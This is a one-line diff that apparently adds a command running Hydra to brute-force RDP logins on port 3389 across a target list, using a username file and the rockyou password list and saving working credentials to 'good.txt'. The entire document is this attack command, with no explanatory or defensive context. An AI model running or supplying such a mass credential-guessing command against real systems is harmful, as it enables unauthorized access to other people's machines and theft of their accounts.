@@ -1,0 +1,1 @@
+hydra.exe -s 3389 -t 5 -V -L logins.txt -P rockyou.txt -o good.txt -M target.txt rdp
